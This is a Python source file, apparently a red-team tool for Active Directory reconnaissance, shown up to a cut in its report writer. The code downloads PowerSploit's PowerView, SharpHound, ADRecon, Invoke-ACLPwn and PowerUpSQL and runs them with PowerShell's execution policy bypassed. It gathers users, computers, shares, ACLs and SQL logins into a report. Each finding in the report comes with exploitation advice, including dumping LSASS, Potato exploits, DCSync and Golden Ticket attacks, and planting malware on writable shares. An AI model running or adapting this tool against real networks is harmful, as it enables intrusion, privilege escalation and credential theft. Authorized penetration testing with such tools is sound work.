#!/usr/bin/env python3
"""
Advanced Domain Enumeration Tool - Red Team Edition
Integrated with: PowerView, SharpHound, ADRecon, Invoke-ACLPwn, PowerUpSQL
Author: Security Assessment Tool
Version: 2.0
"""

import subprocess
import json
import os
import sys
import argparse
import threading
import queue
from datetime import datetime
from pathlib import Path
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import tempfile
import shutil

class Logger:
    """Thread-safe logger with detailed activity tracking"""
    def __init__(self, log_file="domain_enum_log.txt"):
        self.log_file = log_file
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        self._init_log()
        
    def _init_log(self):
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 100 + "\n")
            f.write(f"Domain Enumeration Log - Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 100 + "\n\n")
    
    def log(self, activity, command="", status="INFO", error="", thread_id=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        thread_info = f"[Thread-{thread_id}]" if thread_id else "[Main]"
        log_entry = f"[{timestamp}] {thread_info} [{status}] Activity: {activity}"
        
        if command:
            log_entry += f"\n    Command: {command}"
        if error:
            log_entry += f"\n    Error: {error}"
        
        with self.lock:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + "\n")
        
        color_codes = {
            'SUCCESS': '\033[92m',
            'ERROR': '\033[91m',
            'WARN': '\033[93m',
            'INFO': '\033[94m',
            'CRITICAL': '\033[95m'
        }
        reset = '\033[0m'
        color = color_codes.get(status, '')
        print(f"{color}{thread_info} [{status}] {activity}{reset}")

class ToolIntegration:
    """Manages external tool downloads and execution"""
    def __init__(self, logger, temp_dir):
        self.logger = logger
        self.temp_dir = temp_dir
        self.tools = {
            'powerview': {
                'url': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
                'file': os.path.join(temp_dir, 'PowerView.ps1'),
                'type': 'powershell'
            },
            'sharphound': {
                'url': 'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1',
                'file': os.path.join(temp_dir, 'SharpHound.ps1'),
                'type': 'powershell'
            },
            'adrecon': {
                'url': 'https://raw.githubusercontent.com/adrecon/ADRecon/master/ADRecon.ps1',
                'file': os.path.join(temp_dir, 'ADRecon.ps1'),
                'type': 'powershell'
            },
            'invoke-aclpwn': {
                'url': 'https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1',
                'file': os.path.join(temp_dir, 'Invoke-ACLPwn.ps1'),
                'type': 'powershell'
            },
            'powerupsql': {
                'url': 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1',
                'file': os.path.join(temp_dir, 'PowerUpSQL.ps1'),
                'type': 'powershell'
            }
        }
    
    def download_tool(self, tool_name):
        """Download tool from GitHub"""
        if tool_name not in self.tools:
            self.logger.log(f"Unknown tool: {tool_name}", status="ERROR")
            return False
        
        tool_info = self.tools[tool_name]
        self.logger.log(f"Downloading {tool_name}", status="INFO")
        
        try:
            ps_download = f"""
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri '{tool_info['url']}' -OutFile '{tool_info['file']}' -UseBasicParsing
            """
            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_download],
                                  capture_output=True, text=True, timeout=60)
            
            if os.path.exists(tool_info['file']):
                self.logger.log(f"{tool_name} downloaded successfully", status="SUCCESS")
                return True
            else:
                self.logger.log(f"Failed to download {tool_name}", error=result.stderr, status="ERROR")
                return False
        except Exception as e:
            self.logger.log(f"Download failed for {tool_name}", error=str(e), status="ERROR")
            return False
    
    def get_tool_path(self, tool_name):
        """Get path to downloaded tool"""
        return self.tools.get(tool_name, {}).get('file', '')

class EnumerationTask:
    """Represents a single enumeration task"""
    def __init__(self, name, function, priority=1, enabled=True):
        self.name = name
        self.function = function
        self.priority = priority
        self.enabled = enabled
        self.result = None
        self.error = None
        self.start_time = None
        self.end_time = None
    
    def execute(self, *args, **kwargs):
        """Execute the task"""
        self.start_time = datetime.now()
        try:
            self.result = self.function(*args, **kwargs)
            self.end_time = datetime.now()
            return self.result
        except Exception as e:
            self.error = str(e)
            self.end_time = datetime.now()
            raise

class DomainEnumerator:
    """Main enumeration engine with multi-threading support"""
    def __init__(self, config):
        self.config = config
        self.logger = Logger()
        self.temp_dir = tempfile.mkdtemp(prefix='domain_enum_')
        self.tool_integration = ToolIntegration(self.logger, self.temp_dir)
        
        self.results = {
            'metadata': {
                'start_time': datetime.now().isoformat(),
                'hostname': os.getenv('COMPUTERNAME', 'Unknown'),
                'username': os.getenv('USERNAME', 'Unknown')
            },
            'current_user': {},
            'local_privileges': {},
            'domain_info': {},
            'users': [],
            'computers': [],
            'groups': [],
            'shares': [],
            'gpo': [],
            'acls': [],
            'sql_instances': [],
            'bloodhound_data': {},
            'powerview_data': {},
            'adrecon_data': {},
            'aclpwn_data': {},
            'powerupsql_data': {},
            'interesting_findings': [],
            'weaknesses': []
        }
        
        self.task_queue = queue.Queue()
        self.result_lock = threading.Lock()
        
    def run_command(self, command, shell=False, powershell=False, timeout=300, thread_id=""):
        """Execute command and return output"""
        try:
            if powershell:
                full_cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', command]
            else:
                full_cmd = command if isinstance(command, list) else command.split()
            
            self.logger.log(f"Executing command", command=str(full_cmd)[:200], status="INFO", thread_id=thread_id)
            result = subprocess.run(full_cmd, capture_output=True, text=True, 
                                  timeout=timeout, shell=shell)
            
            if result.returncode != 0 and result.stderr:
                self.logger.log("Command completed with warnings", error=result.stderr[:200], 
                              status="WARN", thread_id=thread_id)
            
            return result.stdout
        except subprocess.TimeoutExpired:
            self.logger.log("Command timeout", error=f"Timeout after {timeout}s", 
                          status="ERROR", thread_id=thread_id)
            return ""
        except Exception as e:
            self.logger.log("Command execution failed", error=str(e), 
                          status="ERROR", thread_id=thread_id)
            return ""
    
    def enumerate_current_user(self, thread_id=""):
        """Enumerate current user context"""
        self.logger.log("Enumerating current user context", status="INFO", thread_id=thread_id)
        
        output = self.run_command("whoami /all", thread_id=thread_id)
        priv_output = self.run_command("whoami /priv", thread_id=thread_id)
        groups_output = self.run_command("whoami /groups", thread_id=thread_id)
        
        with self.result_lock:
            self.results['current_user'] = {
                'whoami': output,
                'privileges': priv_output,
                'groups': groups_output
            }
        
        return True
    
    def enumerate_local_system(self, thread_id=""):
        """Enumerate local system information"""
        self.logger.log("Enumerating local system", status="INFO", thread_id=thread_id)
        
        systeminfo = self.run_command("systeminfo", thread_id=thread_id)
        local_users = self.run_command("net user", thread_id=thread_id)
        local_groups = self.run_command("net localgroup", thread_id=thread_id)
        admin_check = self.run_command("net session", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['local_privileges'] = {
                'systeminfo': systeminfo,
                'local_users': local_users,
                'local_groups': local_groups,
                'is_admin': "Access is denied" not in admin_check
            }
        
        return True
    
    def enumerate_domain_basic(self, thread_id=""):
        """Enumerate basic Active Directory domain information"""
        self.logger.log("Enumerating domain information", status="INFO", thread_id=thread_id)
        
        ps_cmd = """
        try {
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $domainInfo = @{
                Name = $domain.Name
                Forest = $domain.Forest.Name
                DomainControllers = $domain.DomainControllers | ForEach-Object { $_.Name }
            }
            $domainInfo | ConvertTo-Json
        } catch {
            Write-Output "Error: $_"
        }
        """
        domain_info = self.run_command(ps_cmd, powershell=True, thread_id=thread_id)
        
        dc_output = self.run_command("nltest /dclist:", shell=True, thread_id=thread_id)
        users_output = self.run_command("net user /domain", shell=True, thread_id=thread_id)
        computers_output = self.run_command("net group 'Domain Computers' /domain", shell=True, thread_id=thread_id)
        groups_output = self.run_command("net group /domain", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['domain_info']['basic'] = domain_info
            self.results['domain_info']['domain_controllers'] = dc_output
            self.results['users'] = self.parse_net_output(users_output)
            self.results['computers'] = self.parse_net_output(computers_output)
            self.results['groups'] = self.parse_net_output(groups_output)
        
        return True
    
    def enumerate_powerview(self, thread_id=""):
        """Execute PowerView enumeration"""
        if not self.config.powerview:
            return False
        
        self.logger.log("Running PowerView enumeration", status="INFO", thread_id=thread_id)
        
        if not self.tool_integration.download_tool('powerview'):
            return False
        
        powerview_path = self.tool_integration.get_tool_path('powerview')
        
        ps_script = f"""
        Import-Module '{powerview_path}'
        
        $results = @{{}}
        
        # Domain information
        $results['Domain'] = Get-Domain | Select-Object Name, Forest, DomainControllers | ConvertTo-Json
        
        # Domain users
        $results['DomainUsers'] = Get-DomainUser | Select-Object samaccountname, description, memberof -First 100 | ConvertTo-Json
        
        # Domain computers
        $results['DomainComputers'] = Get-DomainComputer | Select-Object dnshostname, operatingsystem, lastlogon -First 100 | ConvertTo-Json
        
        # Domain admins
        $results['DomainAdmins'] = Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName, MemberSID | ConvertTo-Json
        
        # Find domain shares
        $results['DomainShares'] = Find-DomainShare -CheckShareAccess | Select-Object Name, Path, Type -First 50 | ConvertTo-Json
        
        # Domain trusts
        $results['DomainTrusts'] = Get-DomainTrust | Select-Object SourceName, TargetName, TrustType | ConvertTo-Json
        
        # ACLs with interesting permissions
        $results['InterestingACLs'] = Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier -First 50 | ConvertTo-Json
        
        $results | ConvertTo-Json -Depth 10
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['powerview_data'] = output
        
        self.logger.log("PowerView enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_sharphound(self, thread_id=""):
        """Execute SharpHound for BloodHound data collection"""
        if not self.config.sharphound:
            return False
        
        self.logger.log("Running SharpHound enumeration", status="INFO", thread_id=thread_id)
        
        if not self.tool_integration.download_tool('sharphound'):
            return False
        
        sharphound_path = self.tool_integration.get_tool_path('sharphound')
        output_dir = self.temp_dir
        
        ps_script = f"""
        Import-Module '{sharphound_path}'
        Invoke-BloodHound -CollectionMethod All -OutputDirectory '{output_dir}' -OutputPrefix 'bloodhound' -NoSaveCache
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=900, thread_id=thread_id)
        
        # Find generated zip file
        zip_files = [f for f in os.listdir(output_dir) if f.startswith('bloodhound') and f.endswith('.zip')]
        
        with self.result_lock:
            self.results['bloodhound_data'] = {
                'output': output,
                'zip_file': zip_files[0] if zip_files else None,
                'path': os.path.join(output_dir, zip_files[0]) if zip_files else None
            }
        
        self.logger.log("SharpHound enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_adrecon(self, thread_id=""):
        """Execute ADRecon enumeration"""
        if not self.config.adrecon:
            return False
        
        self.logger.log("Running ADRecon enumeration", status="INFO", thread_id=thread_id)
        
        if not self.tool_integration.download_tool('adrecon'):
            return False
        
        adrecon_path = self.tool_integration.get_tool_path('adrecon')
        output_dir = os.path.join(self.temp_dir, 'ADRecon')
        
        ps_script = f"""
        . '{adrecon_path}'
        Invoke-ADRecon -OutputDir '{output_dir}' -Collect All
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=1200, thread_id=thread_id)
        
        with self.result_lock:
            self.results['adrecon_data'] = {
                'output': output,
                'output_dir': output_dir
            }
        
        self.logger.log("ADRecon enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_aclpwn(self, thread_id=""):
        """Execute Invoke-ACLPwn for ACL attack paths"""
        if not self.config.aclpwn:
            return False
        
        self.logger.log("Running Invoke-ACLPwn enumeration", status="INFO", thread_id=thread_id)
        
        if not self.tool_integration.download_tool('invoke-aclpwn'):
            return False
        
        aclpwn_path = self.tool_integration.get_tool_path('invoke-aclpwn')
        
        ps_script = f"""
        . '{aclpwn_path}'
        $results = Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier -First 100
        $results | ConvertTo-Json
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['aclpwn_data'] = output
        
        self.logger.log("Invoke-ACLPwn enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_powerupsql(self, thread_id=""):
        """Execute PowerUpSQL for SQL Server enumeration"""
        if not self.config.powerupsql:
            return False
        
        self.logger.log("Running PowerUpSQL enumeration", status="INFO", thread_id=thread_id)
        
        if not self.tool_integration.download_tool('powerupsql'):
            return False
        
        powerupsql_path = self.tool_integration.get_tool_path('powerupsql')
        
        ps_script = f"""
        Import-Module '{powerupsql_path}'
        
        $results = @{{}}
        
        # Discover SQL instances
        $results['SQLInstances'] = Get-SQLInstanceDomain | Select-Object ComputerName, Instance, DomainAccount -First 50 | ConvertTo-Json
        
        # Check default credentials
        $results['DefaultCreds'] = Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {{$_.Status -eq 'Accessible'}} | ConvertTo-Json
        
        $results | ConvertTo-Json -Depth 5
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['powerupsql_data'] = output
            self.results['sql_instances'] = output
        
        self.logger.log("PowerUpSQL enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_shares(self, thread_id=""):
        """Enumerate network shares"""
        self.logger.log("Enumerating network shares", status="INFO", thread_id=thread_id)
        
        shares_output = self.run_command("net share", thread_id=thread_id)
        
        ps_cmd = """
        try {
            Get-SmbShare | Select-Object Name, Path, Description, CurrentUsers | ConvertTo-Json
        } catch {
            Write-Output "[]"
        }
        """
        smb_shares = self.run_command(ps_cmd, powershell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['shares'].append({'type': 'local', 'data': shares_output})
            self.results['shares'].append({'type': 'smb', 'data': smb_shares})
        
        return True
    
    def enumerate_gpo(self, thread_id=""):
        """Enumerate Group Policy Objects"""
        self.logger.log("Enumerating GPOs", status="INFO", thread_id=thread_id)
        
        gpo_user = self.run_command("gpresult /r /scope:user", shell=True, thread_id=thread_id)
        gpo_computer = self.run_command("gpresult /r /scope:computer", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['gpo'].append({'scope': 'user', 'data': gpo_user})
            self.results['gpo'].append({'scope': 'computer', 'data': gpo_computer})
        
        return True
    
    def analyze_weaknesses(self, thread_id=""):
        """Analyze collected data for security weaknesses"""
        self.logger.log("Analyzing for security weaknesses", status="INFO", thread_id=thread_id)
        
        findings = []
        
        # Check current user privileges
        privileges = str(self.results['current_user'].get('privileges', ''))
        
        if 'SeImpersonatePrivilege' in privileges and 'Enabled' in privileges:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'SeImpersonatePrivilege Enabled',
                'description': 'User has SeImpersonatePrivilege - vulnerable to Potato attacks',
                'recommendation': 'Exploit: JuicyPotato, RoguePotato, PrintSpoofer',
                'cvss': '7.8'
            })
        
        if 'SeDebugPrivilege' in privileges and 'Enabled' in privileges:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Privilege Escalation',
                'finding': 'SeDebugPrivilege Enabled',
                'description': 'User can debug any process - direct path to SYSTEM',
                'recommendation': 'Memory dump LSASS, inject into privileged processes',
                'cvss': '9.3'
            })
        
        if 'SeLoadDriverPrivilege' in privileges:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'SeLoadDriverPrivilege Enabled',
                'description': 'User can load kernel drivers - privilege escalation possible',
                'recommendation': 'Exploit: Capcom.sys, other vulnerable drivers',
                'cvss': '7.8'
            })
        
        # Check admin rights
        if self.results['local_privileges'].get('is_admin'):
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Local Administrator Access',
                'description': 'Current user has local administrator privileges',
                'recommendation': 'Full local system compromise possible, dump credentials',
                'cvss': '9.0'
            })
        
        # Check for writable shares
        for share in self.results['shares']:
            share_str = str(share)
            if 'Everyone' in share_str or 'FULL' in share_str or 'CHANGE' in share_str:
                findings.append({
                    'severity': 'MEDIUM',
                    'category': 'Lateral Movement',
                    'finding': 'Writable Network Share',
                    'description': f'Share with weak permissions detected: {share_str[:100]}',
                    'recommendation': 'Check for write access, potential for malware deployment',
                    'cvss': '5.5'
                })
        
        # Check domain groups membership
        groups = str(self.results['current_user'].get('groups', ''))
        if 'Domain Admins' in groups:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Domain Administrator Account',
                'description': 'User is member of Domain Admins group',
                'recommendation': 'Full domain compromise - DCSync, Golden Ticket attacks',
                'cvss': '10.0'
            })
        
        if 'Enterprise Admins' in groups:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Enterprise Administrator Account',
                'description': 'User is member of Enterprise Admins group',
                'recommendation': 'Full forest compromise possible',
                'cvss': '10.0'
            })
        
        # Analyze PowerView data for interesting ACLs
        powerview_data = str(self.results.get('powerview_data', ''))
        if 'GenericAll' in powerview_data or 'WriteDacl' in powerview_data:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'Dangerous ACL Permissions',
                'description': 'User has GenericAll or WriteDacl on domain objects',
                'recommendation': 'Review PowerView output for ACL abuse paths',
                'cvss': '8.0'
            })
        
        # Check for SQL instances
        if self.results.get('sql_instances'):
            findings.append({
                'severity': 'MEDIUM',
                'category': 'Attack Surface',
                'finding': 'SQL Server Instances Discovered',
                'description': 'SQL Server instances found in domain',
                'recommendation': 'Test for default credentials, SQL injection, xp_cmdshell',
                'cvss': '6.5'
            })
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        findings.sort(key=lambda x: severity_order.get(x['severity'], 4))
        
        with self.result_lock:
            self.results['weaknesses'] = findings
            self.results['interesting_findings'] = [f for f in findings if f['severity'] in ['CRITICAL', 'HIGH']]
        
        self.logger.log(f"Analysis complete - {len(findings)} findings identified", 
                       status="SUCCESS", thread_id=thread_id)
        return True
    
    def parse_net_output(self, output):
        """Parse net command output to extract items"""
        lines = output.split('\n')
        items = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('-') and not line.startswith('The command') and not line.startswith('User accounts'):
                items.extend([item.strip() for item in line.split() if item.strip()])
        return [item for item in items if len(item) > 2 and not item.startswith('\\\\')]
    
    def worker(self, task, worker_id):
        """Worker thread function"""
        try:
            self.logger.log(f"Starting task: {task.name}", status="INFO", thread_id=worker_id)
            result = task.execute(thread_id=worker_id)
            self.logger.log(f"Completed task: {task.name}", status="SUCCESS", thread_id=worker_id)
            return result
        except Exception as e:
            self.logger.log(f"Task failed: {task.name}", error=str(e), status="ERROR", thread_id=worker_id)
            return None
    
    def run_enumeration_parallel(self):
        """Execute enumeration tasks in parallel"""
        # Define all enumeration tasks
        tasks = [
            EnumerationTask("Current User", self.enumerate_current_user, priority=1, enabled=True),
            EnumerationTask("Local System", self.enumerate_local_system, priority=1, enabled=True),
            EnumerationTask("Domain Basic", self.enumerate_domain_basic, priority=1, enabled=True),
            EnumerationTask("Shares", self.enumerate_shares, priority=2, enabled=True),
            EnumerationTask("GPO", self.enumerate_gpo, priority=2, enabled=True),
            EnumerationTask("PowerView", self.enumerate_powerview, priority=3, enabled=self.config.powerview),
            EnumerationTask("SharpHound", self.enumerate_sharphound, priority=3, enabled=self.config.sharphound),
            EnumerationTask("ADRecon", self.enumerate_adrecon, priority=3, enabled=self.config.adrecon),
            EnumerationTask("ACLPwn", self.enumerate_aclpwn, priority=4, enabled=self.config.aclpwn),
            EnumerationTask("PowerUpSQL", self.enumerate_powerupsql, priority=4, enabled=self.config.powerupsql),
        ]
        
        # Filter enabled tasks
        enabled_tasks = [task for task in tasks if task.enabled]
        
        self.logger.log(f"Starting parallel enumeration with {len(enabled_tasks)} tasks", status="INFO")
        
        # Execute tasks in parallel with thread pool
        max_workers = min(self.config.threads, len(enabled_tasks))
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_task = {
                executor.submit(self.worker, task, f"W{i}"): task 
                for i, task in enumerate(enabled_tasks, 1)
            }
            
            for future in as_completed(future_to_task):
                task = future_to_task[future]
                try:
                    result = future.result()
                except Exception as e:
                    self.logger.log(f"Task exception: {task.name}", error=str(e), status="ERROR")
        
        # Run analysis after all enumeration is complete
        self.logger.log("All enumeration tasks completed, running analysis", status="INFO")
        self.analyze_weaknesses()
    
    def generate_ascii_diagram(self):
        """Generate enhanced ASCII diagram of domain structure"""
        diagram = []
        w = 100  # Width
        
        diagram.append("=" * w)
        diagram.append("                                 DOMAIN TOPOLOGY DIAGRAM".center(w))
        diagram.append("=" * w)
        diagram.append("")
        
        # Extract domain name
        domain_name = "DOMAIN.LOCAL"
        try:
            domain_info = json.loads(self.results['domain_info'].get('basic', '{}'))
            if isinstance(domain_info, dict) and 'Name' in domain_info:
                domain_name = domain_info['Name']
        except:
            pass
        
        # Domain root
        diagram.append(f"                                   [{domain_name}]".center(w))
        diagram.append("                                        |".center(w))
        diagram.append("               +------------------------+------------------------+".center(w))
        diagram.append("               |                        |                        |".center(w))
        diagram.append("        [Domain Controllers]      [User Objects]         [Computer Objects]".center(w))
        diagram.append("")
        
        # Domain Controllers
        dcs = self.extract_domain_controllers()
        if dcs:
            diagram.append("    Domain Controllers:".ljust(w))
            for i, dc in enumerate(dcs[:5]):
                diagram.append(f"      [{i+1}] {dc['name']:<30} IP: {dc['ip']:<15}".ljust(w))
        
        diagram.append("")
        diagram.append("    Critical Groups & Membership:".ljust(w))
        diagram.append("    " + "-" * 80)
        
        # High-value groups
        key_groups = ['Domain Admins', 'Enterprise Admins', 'Administrators', 'Backup Operators']
        for group in key_groups:
            if group in str(self.results['groups']):
                diagram.append(f"      [+] {group}".ljust(w))
        
        diagram.append("")
        diagram.append("    Current User Privileges:".ljust(w))
        diagram.append("    " + "-" * 80)
        
        # Show if user is admin
        if self.results['local_privileges'].get('is_admin'):
            diagram.append("      [!!!] LOCAL ADMINISTRATOR ACCESS".ljust(w))
        
        # Show critical privileges
        privileges = str(self.results['current_user'].get('privileges', ''))
        critical_privs = ['SeDebugPrivilege', 'SeImpersonatePrivilege', 'SeLoadDriverPrivilege']
        for priv in critical_privs:
            if priv in privileges:
                diagram.append(f"      [!] {priv}".ljust(w))
        
        diagram.append("")
        diagram.append("    Attack Surface Summary:".ljust(w))
        diagram.append("    " + "-" * 80)
        diagram.append(f"      Users:     {len(self.results['users']):>6}".ljust(w))
        diagram.append(f"      Computers: {len(self.results['computers']):>6}".ljust(w))
        diagram.append(f"      Groups:    {len(self.results['groups']):>6}".ljust(w))
        diagram.append(f"      Shares:    {len(self.results['shares']):>6}".ljust(w))
        
        if self.results.get('sql_instances'):
            try:
                sql_data = json.loads(self.results['sql_instances'])
                if isinstance(sql_data, dict) and 'SQLInstances' in sql_data:
                    sql_count = len(json.loads(sql_data['SQLInstances']))
                    diagram.append(f"      SQL Instances: {sql_count:>6}".ljust(w))
            except:
                pass
        
        diagram.append("")
        diagram.append("    CRITICAL FINDINGS:".ljust(w))
        diagram.append("    " + "=" * 80)
        
        # Show top 5 critical findings
        critical_findings = [f for f in self.results['weaknesses'] if f['severity'] in ['CRITICAL', 'HIGH']]
        for i, finding in enumerate(critical_findings[:5], 1):
            severity_symbol = "!!!" if finding['severity'] == 'CRITICAL' else "!!"
            diagram.append(f"      [{severity_symbol}] {finding['finding']:<50} CVSS: {finding.get('cvss', 'N/A')}".ljust(w))
        
        if len(critical_findings) > 5:
            diagram.append(f"      ... and {len(critical_findings) - 5} more critical findings".ljust(w))
        
        diagram.append("")
        diagram.append("    Tool Integration Status:".ljust(w))
        diagram.append("    " + "-" * 80)
        diagram.append(f"      PowerView:   {'[COMPLETED]' if self.config.powerview else '[DISABLED]'}".ljust(w))
        diagram.append(f"      SharpHound:  {'[COMPLETED]' if self.config.sharphound else '[DISABLED]'}".ljust(w))
        diagram.append(f"      ADRecon:     {'[COMPLETED]' if self.config.adrecon else '[DISABLED]'}".ljust(w))
        diagram.append(f"      ACLPwn:      {'[COMPLETED]' if self.config.aclpwn else '[DISABLED]'}".ljust(w))
        diagram.append(f"      PowerUpSQL:  {'[COMPLETED]' if self.config.powerupsql else '[DISABLED]'}".ljust(w))
        
        diagram.append("")
        diagram.append("=" * w)
        
        return "\n".join(diagram)
    
    def extract_domain_controllers(self):
        """Extract DC information from results"""
        dcs = []
        dc_output = self.results['domain_info'].get('domain_controllers', '')
        
        # Parse DC list
        lines = dc_output.split('\n')
        for line in lines:
            if '\\\\' in line:
                parts = line.split()
                if len(parts) > 0:
                    dc_name = parts[0].replace('\\\\', '').strip()
                    dc_ip = '0.0.0.0'
                    # Try to extract IP if present
                    for part in parts:
                        if '.' in part and part.replace('.', '').isdigit():
                            dc_ip = part
                            break
                    dcs.append({'name': dc_name, 'ip': dc_ip})
        
        # Also try to parse from domain info JSON
        try:
            domain_info = json.loads(self.results['domain_info'].get('basic', '{}'))
            if isinstance(domain_info, dict) and 'DomainControllers' in domain_info:
                dc_list = domain_info['DomainControllers']
                if isinstance(dc_list, list):
                    for dc in dc_list:
                        if dc not in [d['name'] for d in dcs]:
                            dcs.append({'name': dc, 'ip': '0.0.0.0'})
        except:
            pass
        
        return dcs if dcs else [{'name': 'DC01', 'ip': '0.0.0.0'}]
    
    def generate_report(self, output_file="domain_enum_report.txt"):
        """Generate comprehensive text report"""
        self.logger.log("Generating final report", status="INFO")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            w = 100  # Width for formatting
            
            # Header
            f.write("=" * w + "\n")
            f.write("              DOMAIN ENUMERATION REPORT - RED TEAM PERSPECTIVE\n".center(w))
            f.write("=" * w + "\n")
            f.write(f"Generated:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Executed By:  {self.results['metadata']['username']}\n")
            f.write(f"Hostname:     {self.results['metadata']['hostname']}\n")
            f.write(f"Threads Used: {self.config.threads}\n")
            f.write("=" * w + "\n\n")
            
            # ASCII Diagram
            f.write(self.generate_ascii_diagram())
            f.write("\n\n")
            
            # Executive Summary
            f.write("=" * w + "\n")
            f.write("                             EXECUTIVE SUMMARY\n".center(w))
            f.write("=" * w + "\n")
            critical_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'CRITICAL'])
            high_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'HIGH'])
            medium_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'MEDIUM'])
            
            f.write(f"\nRisk Assessment:\n")
            f.write(f"  Critical Issues:  {critical_count:>3}\n")
            f.write(f"  High Issues:      {high_count:>3}\n")
            f.write(f"  Medium Issues:    {medium_count:>3}\n")
            f.write(f"\nDiscovered Assets:\n")
            f.write(f"  Domain Users:     {len(self.results['users']):>6}\n")
            f.write(f"  Domain Computers: {len(self.results['computers']):>6}\n")
            f.write(f"  Domain Groups:    {len(self.results['groups']):>6}\n")
            f.write(f"  Network Shares:   {len(self.results['shares']):>6}\n")
            
            f.write("\n\n")
            
            # Current User Context
            f.write("=" * w + "\n")
            f.write("                          CURRENT USER CONTEXT\n".center(w))
            f.write("=" * w + "\n\n")
            f.write("WHO AM I:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('whoami', 'N/A')))
            f.write("\n\n")
            
            f.write("PRIVILEGES:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('privileges', 'N/A')))
            f.write("\n\n")
            
            f.write("GROUP MEMBERSHIPS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('groups', 'N/A')))
            f.write("\n\n")
            
            # Security Weaknesses - MOST IMPORTANT SECTION
            f.write("=" * w + "\n")
            f.write("          SECURITY WEAKNESSES & RED TEAM EXPLOITATION OPPORTUNITIES\n".center(w))
            f.write("=" * w + "\n\n")
            
            for i, finding in enumerate(self.results['weaknesses'], 1):
                f.write(f"\n[{i}] {finding['finding']}\n")
                f.write("=" * w + "\n")
                f.write(f"Severity:     {finding['severity']}\n")
                f.write(f"Category:     {finding['category']}\n")
                f.write(f"CVSS Score:   {finding.get('cvss', 'N/A')}\n")
                f.write(f"\nDescription:\n  {finding['description']}\n")
                f.write(f"\nExploitation:\n  {finding['recommendation']}\n")
                f.write("-" * w + "\n")
            
            f.write("\n\n")
            
            # Domain Information
            f.write("=" * w + "\n")
            f.write("                            DOMAIN INFORMATION\n".center(w))
            f.write("=" * w + "\n\n")
            f.write("BASIC DOMAIN INFO:\n")
            f.write("-" * w + "\n")
            try:
                domain_json = json.loads(self.results['domain_info'].get('basic', '{}'))
                f.write(json.dumps(domain_json, indent=2))
            except:
                f.write(str(self.results['domain_info'].get('basic', 'N/A')))
            f.write("\n\n")
            
            f.write("DOMAIN CONTROLLERS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['domain_info'].get('domain_controllers', 'N/A')))
            f.write("\n\n")
            
            # Users (limited output)
            f.write("DOMAIN USERS (Sample):\n")
            f.write("-" * w + "\n")
            for user in self.results['users'][:100]:
                f.write(f"  - {user}\n")
            if len(self.results['users']) > 100:
                f.write(f"  ... and {len(self.results['users']) - 100} more users\n")
            f.write("\n\n")
            
            # Computers (limited output)
            f.write("DOMAIN COMPUTERS (Sample):\n")
            f.write("-" * w + "\n")
            for computer in self.results['computers'][:100]:
                f.write(f"  - {computer}\n")
            if len(self.results['computers']) > 100:
                f.write(f"  ... and {len(self.results['computers']) - 100} more computers\n")
            f.write("\n\n")
            
            # Groups
            f.write("DOMAIN GROUPS:\n")
